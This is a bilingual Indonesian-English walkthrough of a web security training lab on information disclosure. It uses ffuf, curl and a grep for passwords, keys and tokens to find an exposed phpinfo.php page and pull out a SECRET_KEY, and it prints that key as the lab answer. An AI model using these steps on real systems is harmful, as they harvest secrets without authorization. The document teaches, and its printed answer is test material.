# Lab: Information disclosure on debug page

**Category**: Information Disclosure / Debug Pages & Sensitive Files  
**Goal**: Mengidentifikasi halaman debug tersembunyi (*hidden debug page / phpinfo*) dan menemukan variabel lingkungan `SECRET_KEY`.  
*Identify a hidden debug page (`phpinfo.php`) disclosing sensitive environment variables and obtain the `SECRET_KEY`.*

---

## 📌 Overview & Prerequisite Knowledge / Gambaran Umum & Pengetahuan Dasar

- **Debug Page Exposure (Keterpaparan Halaman Debug)**: 
  Halaman debug seperti `phpinfo.php` atau endpoint `/cgi-bin/` sering ditinggalkan secara tidak sengaja oleh pengembang. Halaman ini membocorkan informasi konfigurasi server, versi PHP, path sistem file, dan *environment variables*.
  *Debug pages like `phpinfo.php` contain comprehensive server configurations, PHP build info, file paths, and environment variables left accessible to the public.*
- **Directory Fuzzing / Content Discovery**: 
  Teknik brute-force direktori menggunakan tools seperti `ffuf` atau `gobuster` untuk mengidentifikasi direktori tersembunyi seperti `/cgi-bin/`.
  *Directory brute-forcing techniques using tools like `ffuf` or `gobuster` to discover unlinked endpoints like `/cgi-bin/`.*

---

## 🎯 Solution Summary / Ringkasan Solusi

1. **ID**: Lakukan pemindaian direktori (*directory discovery*) menggunakan `ffuf` / Burp Suite Site Map / `gobuster` untuk menemukan direktori `/cgi-bin/`.  
   **EN**: Perform directory discovery using `ffuf` / Burp Suite Site Map / `gobuster` to find the `/cgi-bin/` directory.
2. **ID**: Telusuri direktori `/cgi-bin/` untuk menemukan file debug `phpinfo.php`.  
   **EN**: Inspect `/cgi-bin/` directory listing to locate the debug file `phpinfo.php`.
3. **ID**: Unduh atau baca isi `phpinfo.php` lalu cari variabel lingkungan `SECRET_KEY` (misalnya: `w3ahx546cpir79yxaiw70kxe5fg0tso8`).  
   **EN**: Download or inspect `phpinfo.php` and search for the `SECRET_KEY` environment variable (e.g., `w3ahx546cpir79yxaiw70kxe5fg0tso8`).
4. **ID**: Submit nilai `SECRET_KEY` pada tombol **Submit solution** untuk menyelesaikan lab.  
   **EN**: Submit the `SECRET_KEY` via **Submit solution** to complete the lab.

![Solution Overview](../../Image%20Asset/Source%20code%20disclosure/Pasted%20image%2020260805165401.png)

---

## 🛠️ Step-by-Step Guide / Panduan Langkah demi Langkah

### Step 1: Directory Fuzzing / Pemindaian Direktori Tersembunyi

**ID**: Jalankan `ffuf` atau `gobuster` untuk memindai direktori yang ada pada aplikasi web target:  
**EN**: Run `ffuf` or `gobuster` to scan for hidden directories on the target web application:

```bash
ffuf -u "https://0a6d00140325fe6081eb0322005100a7.web-security-academy.net/FUZZ" -w /usr/share/wordlists/dirb/common.txt
```

Output:
```text
________________________________________________

 :: Method           : GET
 :: URL              : https://0a6d00140325fe6081eb0322005100a7.web-security-academy.net/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
________________________________________________

cgi-bin                 [Status: 200, Size: 410, Words: 126, Lines: 17, Duration: 209ms]
cgi-bin/                [Status: 200, Size: 410, Words: 126, Lines: 17, Duration: 226ms]
```

---

### Step 2: Inspect `/cgi-bin/` Directory Listing / Memeriksa Isi Folder `/cgi-bin/`

**ID**: Buka atau lakukan `curl` pada direktori `/cgi-bin/` untuk melihat isi folder:  
**EN**: Access or `curl` the `/cgi-bin/` directory to list its contents:

```bash
curl -s https://0a6d00140325fe6081eb0322005100a7.web-security-academy.net/cgi-bin/
```

Output:
```html
<html>
    <head>
        <title>Index of /cgi-bin</title>
    </head>
    <body>
        <h1>Index of /cgi-bin</h1>
        <table>
            <tr><th>Name</th><th>Size</th></tr>
            <tr><td><a href='/cgi-bin/phpinfo.php'>phpinfo.php</a></td><td>21B</td></tr>
        </table>
    </body>
</html>
```

---

### Step 3: Fetch Debug Page `phpinfo.php` / Mengambil File `phpinfo.php`

**ID**: Unduh atau baca konten file `/cgi-bin/phpinfo.php`:  
**EN**: Download or fetch the contents of `/cgi-bin/phpinfo.php`:

```bash
curl -s https://0a6d00140325fe6081eb0322005100a7.web-security-academy.net/cgi-bin/phpinfo.php -o phpinfo.php
```

---

### Step 4: Extract Environment Variable `SECRET_KEY` / Ekstraksi `SECRET_KEY`

**ID**: Gunakan `grep` untuk menelusuri kata kunci `SECRET_KEY` atau `password|secret|key` di dalam file `phpinfo.php`:  
**EN**: Use `grep` to search for `SECRET_KEY` or `password|secret|key` within `phpinfo.php`:

```bash
grep -iE "password|key|secret|token" phpinfo.php
```

Output:
```html
<tr><td class="e">SECRET_KEY </td><td class="v">w3ahx546cpir79yxaiw70kxe5fg0tso8 </td></tr>
<tr><td class="e">$_SERVER['SECRET_KEY']</td><td class="v">w3ahx546cpir79yxaiw70kxe5fg0tso8</td></tr>
```

> [!NOTE]
> **Extracted Secret Key**:  
> `SECRET_KEY = w3ahx546cpir79yxaiw70kxe5fg0tso8`

![PHPInfo Secret Key Output](../../Image%20Asset/Source%20code%20disclosure/Pasted%20image%2020260805172515.png)

---

### Step 5: Submit Solution / Submit Jawaban

**ID**: Kembali ke halaman lab, klik **Submit solution**, lalu masukkan nilai `w3ahx546cpir79yxaiw70kxe5fg0tso8`.  
**EN**: Return to the lab banner, click **Submit solution**, and enter `w3ahx546cpir79yxaiw70kxe5fg0tso8`.

![Lab Solved Confirmation](../../Image%20Asset/Source%20code%20disclosure/Pasted%20image%2020260805172528.png)

> [!SUCCESS]
> **Lab Solved**: Nilai `SECRET_KEY` berhasil ditemukan dari halaman debug `phpinfo.php`!  
> *The `SECRET_KEY` environment variable was successfully extracted from the `phpinfo.php` debug page!*